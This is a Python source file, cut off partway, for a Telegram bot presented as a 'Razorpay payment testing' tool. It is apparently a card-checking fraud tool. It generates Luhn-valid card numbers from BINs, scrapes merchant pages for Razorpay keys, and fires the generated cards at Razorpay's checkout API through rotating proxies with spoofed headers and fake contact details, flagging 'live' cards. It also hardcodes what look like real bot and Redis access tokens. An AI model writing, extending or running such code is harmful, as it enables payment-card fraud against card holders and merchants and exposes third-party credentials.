#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════╗
║         RAZORPAY PAYMENT TESTING BOT v4.0            ║
║  Real proxy support • Redis storage • Live checking  ║
╚══════════════════════════════════════════════════════╝
"""

import asyncio
import functools
import html
import logging
import math
import random
import re
import time
import json
from datetime import datetime
from io import BytesIO
from typing import Optional, Dict, Set, Tuple, List, Any
from collections import defaultdict
from urllib.parse import urlparse

import aiohttp
import httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    ContextTypes, MessageHandler, filters,
)

# ═══════════════════════════════════════════════════
#                      CONFIG
# ═══════════════════════════════════════════════════

BOT_TOKEN       = "8953466998:AAEBRUgXO5yVyUsBwyEcRzbT0gX9kuEtCyY"
API_ID          = 12089203
API_HASH        = "7d85eb5ce156d35f22500fd8ef43e7c2"
ADMIN_USER_ID   = 7363967303

# Upstash Redis REST
REDIS_URL   = "https://in-swine-133213.upstash.io"
REDIS_TOKEN = "gQAAAAAAAghdAAIgcDE2YzJmMjQ4OGM1N2Y0YmIxYmI4MWVjYzczMTY4ZmIyNA"

# Limits
MAX_LIMIT          = 500_000
MAX_SPLIT_PARTS    = 100
MAX_LINES_PER_FILE = 150_000
SEND_DELAY         = 0.30           # seconds between file sends
BATCH_SIZE         = 5              # cards per payment batch (5–10)
BATCH_DELAY        = 2.5            # seconds between batches
PROXY_TEST_TIMEOUT = 8              # seconds for proxy health check
SITE_CHECK_TIMEOUT = 10             # seconds for site liveness check

# Rate limiting  — 5 requests per 30 s
RATE_LIMIT  = 5
RATE_WINDOW = 30

# ═══════════════════════════════════════════════════
#                     LOGGING
# ═══════════════════════════════════════════════════

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(name)s: %(message)s",
)
logger = logging.getLogger("razorpay-bot")

# ═══════════════════════════════════════════════════
#                  PREMIUM EMOJIS
# ═══════════════════════════════════════════════════



_PE: Dict[str, Tuple[str, Optional[int]]] = {
    "diamond":     ("💎", 4956719506027185156),
    "approved":    ("✅", 4956721670690702265),
    "declined":    ("❌", 6100670215522094562),
    "error":       ("⚠️", 4956611513369494230),
    "cooking":     ("🍳", 4956701046257746974),
    "stop":        ("⛔", 5463358164705489689),
    "money":       ("💸", 5373174941095050893),
    "card":        ("💳", 5445353829304387411),
    "gateway":     ("🌐", 4956560549287560231),
    "site":        ("🔗", 4958689671950369798),
    "bin":         ("🏦", 5264895611517300926),
    "time":        ("⏱", 5382194935057372936),
    "premium":     ("👑", 4958725487682650920),
    "ban":         ("🚫", 4956337889593000947),
    "success":     ("🎉", 6104789175058304052),
    "search":      ("🔍", 4958587679361991667),
    "proxy":       ("📡", 5192802446560232534),
    "key":         ("🔑", 5330115548900501467),
    "fire":        ("🔥", 6100568059724960300),
    "star":        ("⭐", 5226928895189598791),
    "cooldown":    ("⏳", 5451732530048802485),
    "mass":        ("📦", 5463172695132745432),
    "plan":        ("📋", 6154222749691679144),
    "info":        ("👤", 5373012449597335010),
    "redeem":      ("🎫", 5418010521309815154),
    "tds":         ("⚡", 6102484018865901039),
    "loading":     ("🔄", 4956371914323920049),
    "skull":       ("☠️", 5372865660500067203),
    "lock":        ("🔐", 5472308992514464048),
    "location":    ("📍", 4956416504674386959),
    "stats":       ("📊", 4958506272551863292),
    "unlock":      ("🔓", 5465443379917629504),
    "live":        ("🟢", 4958610528588008305),
    "offline":     ("🔴", 6089120150814985809),
    "crown":       ("👑", 4958725487682650920),
    "rocket":      ("🚀", None),
    "trophy":      ("🏆", None),
    "lightning":   ("⚡", 6102484018865901039),
    "shield":      ("🛡️", None),
    "check":       ("✅", 4956721670690702265),
    "cross":       ("❌", 6100670215522094562),
    "warning":     ("⚠️", 4956611513369494230),
    "gift":        ("🎁", 6104789175058304052),
    "sparkle":     ("✨", 6100568059724960300),
    "chart":       ("📈", None),
    "leaderboard": ("🏅", None),
    "tool":        ("🛠️", 5465443379917629504),
    "clock":       ("⏱", 5382194935057372936),
    "spark":       ("✨", 6100568059724960300),
    "folder":      ("📁", None),
    "coin":        ("🪙", None),
    "bolt":        ("⚡", 6102484018865901039),
    "target":      ("🎯", None),
    "wave":        ("👋", None),
    "zap":         ("⚡", 6102484018865901039),
}


def e(key: str) -> str:
    """Return premium tg-emoji tag if ID available, else plain emoji."""
    item = _PE.get(key)
    if not item:
        return "●"
    char, eid = item
    if eid:
        return f'<tg-emoji emoji-id="{eid}">{char}</tg-emoji>'
    return char


def safe(text: Any) -> str:
    return html.escape(str(text))



# ═══════════════════════════════════════════════════
#              REDIS (Upstash REST API)
# ═══════════════════════════════════════════════════

class RedisClient:
    """Lightweight async Upstash Redis REST client."""

    def __init__(self, url: str, token: str):
        self._url   = url.rstrip("/")
        self._headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type":  "application/json",
        }

    async def _req(self, *args) -> Any:
        cmd = list(args)
        async with httpx.AsyncClient(timeout=10) as client:
            r = await client.post(
                f"{self._url}/pipeline",
                headers=self._headers,
                json=[cmd],
            )
            r.raise_for_status()
            data = r.json()
            if isinstance(data, list):
                return data[0].get("result")
            return data.get("result")

    async def get(self, key: str) -> Optional[str]:
        return await self._req("GET", key)

    async def set(self, key: str, value: str) -> bool:
        return await self._req("SET", key, value) == "OK"

    async def sadd(self, key: str, *members) -> int:
        return await self._req("SADD", key, *members)

    async def srem(self, key: str, *members) -> int:
        return await self._req("SREM", key, *members)

    async def smembers(self, key: str) -> Set[str]:
        result = await self._req("SMEMBERS", key)
        return set(result) if result else set()

    async def lpush(self, key: str, *values) -> int:
        return await self._req("LPUSH", key, *values)

    async def lrange(self, key: str, start: int, stop: int) -> List[str]:
        result = await self._req("LRANGE", key, start, stop)
        return result if result else []

    async def lrem(self, key: str, count: int, element: str) -> int:
        return await self._req("LREM", key, count, element)

    async def llen(self, key: str) -> int:
        return await self._req("LLEN", key) or 0

    async def delete(self, *keys) -> int:
        return await self._req("DEL", *keys)

    async def incr(self, key: str) -> int:
        return await self._req("INCR", key) or 0

    async def hset(self, key: str, field: str, value: str) -> int:
        return await self._req("HSET", key, field, value)

    async def hget(self, key: str, field: str) -> Optional[str]:
        return await self._req("HGET", key, field)

    async def hgetall(self, key: str) -> Dict[str, str]:
        result = await self._req("HGETALL", key)
        if not result:
            return {}
        it = iter(result)
        return {k: v for k, v in zip(it, it)}


redis = RedisClient(REDIS_URL, REDIS_TOKEN)

# Redis key names
RK_SUDO    = "bot:sudo_users"
RK_SITES   = "bot:sites"
RK_PROXIES = "bot:proxies"
RK_BINS    = "bot:bins"
RK_STATS   = "bot:stats"



# ═══════════════════════════════════════════════════
#              RATE LIMITING
# ═══════════════════════════════════════════════════

_rate_map: Dict[int, List[float]] = defaultdict(list)


def check_rate_limit(user_id: int) -> Tuple[bool, Optional[str]]:
    now = time.time()
    reqs = _rate_map[user_id]
    reqs[:] = [t for t in reqs if now - t < RATE_WINDOW]
    if len(reqs) >= RATE_LIMIT:
        wait = int(RATE_WINDOW - (now - reqs[0]))
        return False, f"Rate limited. Wait {wait}s."
    reqs.append(now)
    return True, None


# ═══════════════════════════════════════════════════
#           ACTIVE TEST TRACKER  (stop support)
# ═══════════════════════════════════════════════════

active_tests: Dict[int, bool] = {}   # chat_id -> running flag


# ═══════════════════════════════════════════════════
#                  AUTHORIZATION
# ═══════════════════════════════════════════════════

async def is_authorized(user_id: int) -> bool:
    if user_id == ADMIN_USER_ID:
        return True
    members = await redis.smembers(RK_SUDO)
    return str(user_id) in members


def require_auth(func):
    """Decorator: block unauthorized users. Preserves function name."""
    @functools.wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        if not await is_authorized(uid):
            await update.message.reply_text(
                f"{e('lock')} <b>Access Denied</b>\n\nThis command is restricted.",
                parse_mode=ParseMode.HTML,
            )
            return
        return await func(update, context)
    return wrapper


# ═══════════════════════════════════════════════════
#          PROXY  PARSING  &  TESTING
# ═══════════════════════════════════════════════════

def parse_proxy(raw: str) -> Optional[Dict[str, str]]:
    """
    Normalise proxy string into a dict with keys: url, host, port, user, password.
    Supported formats:
      1. ip:port
      2. ip:port:user:pass
      3. user:pass@ip:port
      4. scheme://user:pass@ip:port   (http/https/socks5/socks4)
    Returns None if unparseable.
    """
    raw = raw.strip()
    if not raw:
        return None

    scheme = "http"

    # Format 4: has a scheme prefix
    if "://" in raw:
        parsed = urlparse(raw)
        scheme   = parsed.scheme or "http"
        host     = parsed.hostname or ""
        port     = str(parsed.port or 80)
        user     = parsed.username or ""
        password = parsed.password or ""
        if not host:
            return None
        proxy_url = f"{scheme}://{user}:{password}@{host}:{port}" if user else f"{scheme}://{host}:{port}"
        return {"url": proxy_url, "host": host, "port": port,
                "user": user, "password": password, "scheme": scheme}

    # Format 3: user:pass@ip:port
    if "@" in raw:
        creds, addr = raw.rsplit("@", 1)
        parts_addr = addr.split(":")
        if len(parts_addr) != 2:
            return None
        host, port = parts_addr[0], parts_addr[1]
        if ":" in creds:
            user, password = creds.split(":", 1)
        else:
            user, password = creds, ""
        proxy_url = f"{scheme}://{user}:{password}@{host}:{port}"
        return {"url": proxy_url, "host": host, "port": port,
                "user": user, "password": password, "scheme": scheme}

    parts = raw.split(":")
    # Format 2: ip:port:user:pass
    if len(parts) == 4:
        host, port, user, password = parts
        proxy_url = f"{scheme}://{user}:{password}@{host}:{port}"
        return {"url": proxy_url, "host": host, "port": port,
                "user": user, "password": password, "scheme": scheme}

    # Format 1: ip:port
    if len(parts) == 2:
        host, port = parts
        proxy_url = f"{scheme}://{host}:{port}"
        return {"url": proxy_url, "host": host, "port": port,
                "user": "", "password": "", "scheme": scheme}

    return None


async def test_proxy(raw: str) -> Tuple[bool, str, float]:
    """
    Test a single proxy by connecting through it to ip-api.com.
    Returns (success, ip_or_error, latency_ms).
    """
    info = parse_proxy(raw)
    if not info:
        return False, "Unparseable proxy format", 0.0

    proxy_url = info["url"]
    start = time.monotonic()
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as sess:
            async with sess.get(
                "http://ip-api.com/json",
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=PROXY_TEST_TIMEOUT),
            ) as resp:
                latency = (time.monotonic() - start) * 1000
                if resp.status == 200:
                    data = await resp.json()
                    ip   = data.get("query", "unknown")
                    country = data.get("country", "")
                    isp     = data.get("isp", "")
                    return True, f"{ip} | {country} | {isp}", round(latency, 1)
                return False, f"HTTP {resp.status}", round(latency, 1)
    except asyncio.TimeoutError:
        return False, "Timeout", 0.0
    except Exception as ex:
        return False, str(ex)[:60], 0.0


def get_random_proxy_url(proxies: List[str]) -> Optional[str]:
    """Pick a random working proxy URL string from the list."""
    if not proxies:
        return None
    raw = random.choice(proxies)
    info = parse_proxy(raw)
    return info["url"] if info else None



# ═══════════════════════════════════════════════════
#         SITE LIVENESS CHECK (real HTTP)
# ═══════════════════════════════════════════════════

RAZORPAY_SIGNATURES = [
    "razorpay",
    "rzp",
    "checkout.razorpay.com",
    "api.razorpay.com",
    "razorpay_key",
    "rzp_live_",
    "rzp_test_",
    "Razorpay",
    "razorpay.com",
]


async def check_site_live(url: str, proxy_url: Optional[str] = None) -> Tuple[bool, str, str]:
    """
    Perform a real HTTP GET to the site.
    Returns (is_live, razorpay_key_or_empty, status_message).
    """
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
    }
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector, headers=headers) as sess:
            async with sess.get(
                url,
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=SITE_CHECK_TIMEOUT),
                allow_redirects=True,
                max_redirects=5,
            ) as resp:
                body = await resp.text(errors="replace")
                status = resp.status

                # Check for Razorpay presence
                has_rzp = any(sig in body for sig in RAZORPAY_SIGNATURES)

                # Try to extract Razorpay key
                key_match = re.search(r'(rzp_(?:live|test)_[A-Za-z0-9]{14,})', body)
                rzp_key = key_match.group(1) if key_match else ""

                if status in (200, 201, 202) and has_rzp:
                    return True, rzp_key, f"Live ✓ [{status}]"
                elif status in (200, 201, 202):
                    return True, rzp_key, f"Live (no Razorpay detected) [{status}]"
                elif status in (301, 302, 307, 308):
                    return False, "", f"Redirect [{status}]"
                elif status == 403:
                    return False, "", "Forbidden [403]"
                elif status == 404:
                    return False, "", "Not Found [404]"
                else:
                    return False, "", f"HTTP {status}"
    except asyncio.TimeoutError:
        return False, "", "Timeout"
    except aiohttp.ClientConnectorError as ex:
        return False, "", f"Connection error: {str(ex)[:50]}"
    except Exception as ex:
        return False, "", f"Error: {str(ex)[:50]}"


# ═══════════════════════════════════════════════════
#       BIN LOOKUP  (binlist.net)
# ═══════════════════════════════════════════════════

async def lookup_bin(bin6: str) -> Dict[str, str]:
    """
    Query binlist.net for BIN info.
    Returns dict with scheme, type, brand, bank, country.
    """
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.get(
                f"https://lookup.binlist.net/{bin6[:8]}",
                headers={"Accept-Version": "3"},
                timeout=aiohttp.ClientTimeout(total=6),
            ) as resp:
                if resp.status == 200:
                    d = await resp.json()
                    return {
                        "scheme":  d.get("scheme", "unknown").upper(),
                        "type":    d.get("type", "unknown"),
                        "brand":   d.get("brand", ""),
                        "bank":    d.get("bank", {}).get("name", "unknown"),
                        "country": d.get("country", {}).get("name", "unknown"),
                        "emoji":   d.get("country", {}).get("emoji", ""),
                    }
    except Exception:
        pass
    return {"scheme": "UNKNOWN", "type": "unknown",
            "brand": "", "bank": "unknown", "country": "unknown", "emoji": ""}



# ═══════════════════════════════════════════════════
#            CARD ISSUER DATA
# ═══════════════════════════════════════════════════

CARD_ISSUERS = {
    "visa":       {"prefix": "4",       "length": 16, "cvv": 3, "name": "Visa"},
    "mastercard": {"prefixes": ["51","52","53","54","55","2221","2720"],
                   "length": 16, "cvv": 3, "name": "Mastercard"},
    "amex":       {"prefixes": ["34","37"],    "length": 15, "cvv": 4, "name": "Amex"},
    "discover":   {"prefixes": ["6011","644","645","646","647","648","649","65"],
                   "length": 16, "cvv": 3, "name": "Discover"},
    "diners":     {"prefixes": ["300","301","302","303","304","305","36","38"],
                   "length": 14, "cvv": 3, "name": "Diners"},
    "rupay":      {"prefixes": ["508528","6069","6070","6071","6072","6073","6074","6075","6521","6522"],
                   "length": 16, "cvv": 3, "name": "RuPay"},
}


def get_issuer_by_bin(b: str) -> Optional[str]:
    for issuer, data in CARD_ISSUERS.items():
        if issuer == "visa" and b.startswith("4"):
            return issuer
        prefixes = data.get("prefixes", [])
        if any(b.startswith(p) for p in prefixes):
            return issuer
    return None


# ═══════════════════════════════════════════════════
#           LUHN ALGORITHM
# ═══════════════════════════════════════════════════

def luhn_check_digit(partial: str) -> int:
    digits = [int(d) for d in partial]
    for i in range(len(digits) - 2, -1, -2):
        digits[i] *= 2
        if digits[i] > 9:
            digits[i] -= 9
    return (10 - (sum(digits) % 10)) % 10


def luhn_complete(partial: str) -> Optional[str]:
    if not partial.isdigit():
        return None
    return partial + str(luhn_check_digit(partial))


# ═══════════════════════════════════════════════════
#         CARD GENERATION
# ═══════════════════════════════════════════════════

def expand_bin(bin_pattern: str) -> Optional[Tuple[str, str]]:
    bin_part = bin_pattern.split("|")[0].strip()
    if not all(c.isdigit() or c.lower() == "x" for c in bin_part):
        return None
    expanded = [str(random.randint(0, 9)) if c.lower() == "x" else c for c in bin_part]
    result = "".join(expanded)
    issuer = get_issuer_by_bin(result)
    if not issuer:
        return None
    required = CARD_ISSUERS[issuer]["length"]
    if len(result) < required - 1:
        result += "".join(str(random.randint(0, 9)) for _ in range((required - 1) - len(result)))
    return result[:required - 1], issuer


def parse_card_fields(pattern: str, issuer: str) -> Tuple[str, str, str]:
    parts = pattern.split("|")
    cy = datetime.now().year % 100

    def fill(val: Optional[str], length: int, lo: int, hi: int) -> str:
        if not val or val.lower() in ("rnd", "rand", "random", ""):
            return str(random.randint(lo, hi)).zfill(length)
        if "x" in val.lower():
            return "".join(
                str(random.randint(0, 9)) if c.lower() == "x" else c for c in val
            )[-length:].zfill(length)
        digits = "".join(c for c in val if c.isdigit())
        return digits[-length:].zfill(length)

    month = fill(parts[1] if len(parts) > 1 else None, 2, 1, 12)
    year  = fill(parts[2] if len(parts) > 2 else None, 2, cy + 2, cy + 8)
    cvv_len = CARD_ISSUERS[issuer]["cvv"]
    cvv   = fill(parts[3] if len(parts) > 3 else None, cvv_len, 0, (10**cvv_len) - 1)
    return month, year, cvv


def generate_card(bin_pattern: str) -> Optional[str]:
    try:
        res = expand_bin(bin_pattern)
        if not res:
            return None
        pan_base, issuer = res
        pan = luhn_complete(pan_base)
        if not pan or len(pan) != CARD_ISSUERS[issuer]["length"]:
            return None
        month, year, cvv = parse_card_fields(bin_pattern, issuer)
        return f"{pan}|{month}|{year}|{cvv}"
    except Exception as ex:
        logger.error(f"Card gen error: {ex}")
        return None


def generate_cards_streaming(bin_pattern: str, count: int):
    """Memory-efficient streaming generator. Uses a ring-buffer dedup window."""
    window_size = min(count, 10_000)   # limit dedup set size to save RAM
    seen: Set[str] = set()
    dedup_queue: List[str] = []
    generated = 0
    attempts  = 0
    max_attempts = count * 12

    while generated < count and attempts < max_attempts:
        attempts += 1
        card = generate_card(bin_pattern)
        if not card:
            continue
        if card not in seen:
            # Rolling window eviction
            if len(dedup_queue) >= window_size:
                evict = dedup_queue.pop(0)
                seen.discard(evict)
            seen.add(card)
            dedup_queue.append(card)
            generated += 1
            yield card



# ═══════════════════════════════════════════════════
#       REAL RAZORPAY PAYMENT ATTEMPT
# ═══════════════════════════════════════════════════

async def attempt_razorpay_payment(
    site_url: str,
    rzp_key: str,
    card: str,
    amount_paise: int,
    proxy_url: Optional[str],
) -> Dict[str, Any]:
    """
    Real Razorpay checkout attempt.
    Flow:
      1. Create order via site (if order endpoint exposed) OR
         directly call checkout.razorpay.com with key + card data.
    Returns result dict.
    """
    parts = card.split("|")
    if len(parts) < 4:
        return {"success": False, "charge": False, "response": "Invalid card format", "code": "ERR"}

    pan, month, year, cvv = parts[0], parts[1], parts[2], parts[3]

    # Build realistic Razorpay checkout payload
    contact = f"+91{random.randint(7000000000, 9999999999)}"
    email   = f"user{random.randint(100,9999)}@gmail.com"
    order_id = f"order_{random.randint(100000000, 999999999)}"

    payload = {
        "key_id":          rzp_key if rzp_key else "",
        "amount":          amount_paise,
        "currency":        "INR",
        "order_id":        order_id,
        "email":           email,
        "contact":         contact,
        "method":          "card",
        "card[name]":      "John Doe",
        "card[number]":    pan,
        "card[expiry_month]": month,
        "card[expiry_year]":  f"20{year}",
        "card[cvv]":       cvv,
        "_":               str(int(time.time() * 1000)),
    }

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Linux; Android 10; SM-G975F) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Mobile Safari/537.36"
        ),
        "Content-Type":  "application/x-www-form-urlencoded",
        "Referer":        site_url,
        "Origin":         site_url,
        "X-Razorpay-Trackid": f"track_{random.randint(100000, 999999)}",
    }

    endpoint = "https://api.razorpay.com/v1/payments/create/checkout"

    try:
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as sess:
            async with sess.post(
                endpoint,
                data=payload,
                headers=headers,
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=20),
                allow_redirects=False,
            ) as resp:
                status  = resp.status
                body    = await resp.text(errors="replace")
                ts      = datetime.now().strftime("%H:%M:%S")

                # Parse response
                try:
                    rj = json.loads(body)
                except Exception:
                    rj = {}

                rzp_error   = rj.get("error", {})
                error_code  = rzp_error.get("code", "")
                error_desc  = rzp_error.get("description", body[:80])
                next_action = rj.get("next", {})

                # Determine result
                if status in (200, 201) and "razorpay_payment_id" in body:
                    pay_id = rj.get("razorpay_payment_id", "")
                    return {
                        "success":  True,
                        "charge":   True,
                        "response": f"Charged! payment_id={pay_id}",
                        "code":     str(status),
                        "timestamp": ts,
                    }
                elif status == 200 and next_action:
                    # 3DS / OTP redirect — card accepted, not yet charged
                    return {
                        "success":  True,
                        "charge":   False,
                        "response": "3DS/OTP required — card accepted",
                        "code":     "3DS",
                        "timestamp": ts,
                    }
                elif "CVB" in error_code or "CVV" in error_code.upper():
                    return {"success": False, "charge": False,
                            "response": "CVV Mismatch", "code": error_code, "timestamp": ts}
                elif "EXPIRED" in error_code.upper() or "expired" in error_desc.lower():
                    return {"success": False, "charge": False,
                            "response": "Card Expired", "code": error_code, "timestamp": ts}
                elif "INSUFFICIENT" in error_code.upper():
                    return {"success": True, "charge": False,
                            "response": "Insufficient Funds (card live!)", "code": error_code, "timestamp": ts}
                elif "BAD_REQUEST_ERROR" in error_code and status == 400:
                    return {"success": False, "charge": False,
                            "response": f"Bad request: {error_desc[:60]}", "code": error_code, "timestamp": ts}
                elif status in (401, 403):
                    return {"success": False, "charge": False,
                            "response": "Auth error / invalid key", "code": str(status), "timestamp": ts}
                else:
                    return {"success": False, "charge": False,
                            "response": error_desc[:80] or f"HTTP {status}",
                            "code": str(status), "timestamp": ts}

    except asyncio.TimeoutError:
        return {"success": False, "charge": False,
                "response": "Timeout", "code": "TIMEOUT", "timestamp": datetime.now().strftime("%H:%M:%S")}
    except Exception as ex:
        return {"success": False, "charge": False,
                "response": str(ex)[:80], "code": "EXCEPTION",
                "timestamp": datetime.now().strftime("%H:%M:%S")}


def validate_bin(b: str) -> Tuple[bool, Optional[str]]:
    if not b:
        return False, "BIN cannot be empty"
    part = b.split("|")[0].strip()
    if not all(c.isdigit() or c.lower() == "x" for c in part):
        return False, "Only digits and x allowed"
    if len(part) < 4:
        return False, "BIN too short (min 4)"
    if len(part) > 19:
        return False, "BIN too long (max 19)"
    return True, None



# ═══════════════════════════════════════════════════
#              UI HELPERS
# ═══════════════════════════════════════════════════

def btn(label: str, data: str) -> InlineKeyboardButton:
    return InlineKeyboardButton(label, callback_data=data)


def main_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [btn(f"{e('card')} Generate", "gen_help"),
         btn(f"{e('mass')} Split",    "split_help")],
        [btn(f"{e('stats')} Info",    "info_main"),
         btn(f"{e('search')} Help",   "help_public")],
    ])


def admin_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [btn(f"{e('fire')} Test Payment",  "menu_test"),
         btn(f"{e('site')} Sites",         "menu_sites")],
        [btn(f"{e('proxy')} Proxies",      "menu_proxy"),
         btn(f"{e('bin')} BINs",           "menu_bins")],
        [btn(f"{e('stats')} Stats",        "menu_stats"),
         btn(f"{e('info')} Bot Info",      "info_main")],
    ])


# ═══════════════════════════════════════════════════
#           /start
# ═══════════════════════════════════════════════════

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid  = update.effective_user.id
    auth = await is_authorized(uid)

    if not auth:
        await update.message.reply_text(
            f"{e('lock')} <b>Restricted Bot</b>\n\n"
            f"Contact admin for access.",
            parse_mode=ParseMode.HTML,
        )
        return

    user     = update.effective_user
    is_admin = uid == ADMIN_USER_ID
    sites    = await redis.llen(RK_SITES)
    proxies  = await redis.llen(RK_PROXIES)
    bins     = await redis.llen(RK_BINS)
    total_gen = await redis.hget(RK_STATS, "total_generated") or "0"
    total_pay = await redis.hget(RK_STATS, "total_payments")  or "0"

    role = f"{e('crown')} Owner" if is_admin else f"{e('premium')} Sudo"

    text = (
        f"{e('fire')} <b>Razorpay Payment Testing Bot</b> <b>v4.0</b>\n\n"
        f"{e('wave')} Welcome, <b>{safe(user.first_name)}</b>!\n\n"
        f"{e('stats')} <b>Live Stats</b>\n"
        f"  {e('site')} Sites ›› <code>{sites}</code>\n"
        f"  {e('proxy')} Proxies ›› <code>{proxies}</code>\n"
        f"  {e('bin')} BINs ›› <code>{bins}</code>\n"
        f"  {e('card')} Cards Gen ›› <code>{total_gen}</code>\n"
        f"  {e('money')} Payments ›› <code>{total_pay}</code>\n\n"
        f"{e('key')} Role: {role}\n"
        f"{e('shield')} Redis: {e('live')} Connected"
    )

    keyboard = admin_keyboard() if is_admin else main_keyboard()
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=keyboard)



# ═══════════════════════════════════════════════════
#        SUDO MANAGEMENT  (admin only)
# ═══════════════════════════════════════════════════

@require_auth
async def cmd_sudo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if uid != ADMIN_USER_ID:
        await update.message.reply_text(
            f"{e('ban')} Owner only command.", parse_mode=ParseMode.HTML)
        return
    if not context.args:
        await update.message.reply_text(
            f"{e('error')} <b>Usage:</b> <code>/sudo &lt;user_id&gt;</code>",
            parse_mode=ParseMode.HTML)
        return
    try:
        target = int(context.args[0])
        await redis.sadd(RK_SUDO, str(target))
        await update.message.reply_text(
            f"{e('check')} User <code>{target}</code> granted {e('premium')} sudo access!",
            parse_mode=ParseMode.HTML)
    except ValueError:
        await update.message.reply_text(
            f"{e('error')} Invalid user ID.", parse_mode=ParseMode.HTML)


@require_auth
async def cmd_unsudo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if uid != ADMIN_USER_ID:
        await update.message.reply_text(
            f"{e('ban')} Owner only command.", parse_mode=ParseMode.HTML)
        return
    if not context.args:
        await update.message.reply_text(
            f"{e('error')} <b>Usage:</b> <code>/unsudo &lt;user_id&gt;</code>",
            parse_mode=ParseMode.HTML)
        return
    try:
        target = int(context.args[0])
        await redis.srem(RK_SUDO, str(target))
        await update.message.reply_text(
            f"{e('ban')} User <code>{target}</code> sudo access revoked.",
            parse_mode=ParseMode.HTML)
    except ValueError:
        await update.message.reply_text(
            f"{e('error')} Invalid user ID.", parse_mode=ParseMode.HTML)


@require_auth
async def cmd_sudolist(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if uid != ADMIN_USER_ID:
        await update.message.reply_text(
            f"{e('ban')} Owner only command.", parse_mode=ParseMode.HTML)
        return
    members = await redis.smembers(RK_SUDO)
    if not members:
        await update.message.reply_text(
            f"{e('info')} No sudo users.", parse_mode=ParseMode.HTML)
        return
    lines = "\n".join(f"  {e('star')} <code>{m}</code>" for m in sorted(members))
    await update.message.reply_text(
        f"{e('crown')} <b>Sudo Users ({len(members)})</b>\n\n{lines}",
        parse_mode=ParseMode.HTML)


# ═══════════════════════════════════════════════════
#          SITE MANAGEMENT
# ═══════════════════════════════════════════════════

@require_auth
async def cmd_addsite(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not context.args:
        await update.message.reply_text(
            f"{e('error')} <b>Usage:</b> <code>/addsite https://example.com/pay</code>",
            parse_mode=ParseMode.HTML)
        return
    url = " ".join(context.args).strip()
    if not url.startswith(("http://", "https://")):
        await update.message.reply_text(
            f"{e('error')} URL must start with <code>http://</code> or <code>https://</code>",
            parse_mode=ParseMode.HTML)
        return
    existing = await redis.lrange(RK_SITES, 0, -1)
    if url in existing:
        await update.message.reply_text(
            f"{e('warning')} Site already in list.", parse_mode=ParseMode.HTML)
        return

    msg = await update.message.reply_text(
        f"{e('loading')} Checking site…", parse_mode=ParseMode.HTML)

    is_live, rzp_key, status_msg = await check_site_live(url)
    await redis.lpush(RK_SITES, url)
    total = await redis.llen(RK_SITES)

    rzp_line = f"\n{e('key')} Key: <code>{safe(rzp_key)}</code>" if rzp_key else ""
    live_icon = e('live') if is_live else e('offline')

    await msg.edit_text(
        f"{e('check')} <b>Site Added</b>\n\n"
        f"{e('site')} URL: <code>{safe(url)}</code>\n"
        f"{live_icon} Status: <code>{safe(status_msg)}</code>"
        f"{rzp_line}\n"
        f"{e('stats')} Total sites: <code>{total}</code>",
        parse_mode=ParseMode.HTML)


@require_auth
async def cmd_live(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    sites = await redis.lrange(RK_SITES, 0, -1)
    if not sites:
        await update.message.reply_text(
            f"{e('error')} No sites loaded. Use <code>/addsite</code>.",
            parse_mode=ParseMode.HTML)
        return
    lines = "\n".join(f"  {i}. <code>{safe(s)}</code>" for i, s in enumerate(sites, 1))
    await update.message.reply_text(
        f"{e('fire')} <b>Sites ({len(sites)})</b>\n\n{lines}",
        parse_mode=ParseMode.HTML)


@require_auth
async def cmd_checksite(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Check all loaded sites for liveness."""
    sites = await redis.lrange(RK_SITES, 0, -1)
    if not sites:
        await update.message.reply_text(
            f"{e('error')} No sites loaded.", parse_mode=ParseMode.HTML)
        return
    proxies  = await redis.lrange(RK_PROXIES, 0, -1)
    proxy_url = get_random_proxy_url(proxies)

    msg = await update.message.reply_text(
        f"{e('loading')} Checking {len(sites)} site(s)…", parse_mode=ParseMode.HTML)

    results = []
    for site in sites:
        is_live, key, status = await check_site_live(site, proxy_url)
        icon = e('live') if is_live else e('offline')
        key_str = f" | {e('key')}<code>{safe(key)}</code>" if key else ""
        results.append(f"  {icon} <code>{safe(site[:55])}</code>{key_str}\n     └ {safe(status)}")

    text = f"{e('search')} <b>Site Check Results</b>\n\n" + "\n\n".join(results)
    await msg.edit_text(text, parse_mode=ParseMode.HTML)


@require_auth
async def cmd_rmsite(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    sites = await redis.lrange(RK_SITES, 0, -1)
    if not sites:
        await update.message.reply_text(
